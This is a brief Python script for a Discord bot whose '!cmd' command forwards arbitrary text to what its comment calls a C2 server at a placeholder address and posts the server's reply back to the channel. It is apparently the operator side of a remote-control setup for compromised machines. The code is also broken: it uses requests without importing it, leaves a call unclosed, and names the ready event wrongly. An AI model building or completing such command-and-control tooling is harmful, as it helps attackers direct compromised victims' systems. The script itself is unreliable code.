#!/bin/python3

import os
import discord
from discord.ext import commands

bot = commands.Bot(command_prefix='!')

@bot.event
async def onReady():
	print (f'Logged in as {bot.user.name} (ID: ({bot.user.id}))')
	print ('-' * 70 + '\n')
	
@bot.command()
async def cmd(ctx, clientID: str, *args):
	message = ' '.join(args)
	#Send the command to the C2 server
	response = requests.post('https://<CHANGE IP>:<CHANGEME - PORT>', json={"cmd": message
	await ctx.send(response.text)
	
bot.run('YOUR BOT TOKEN')
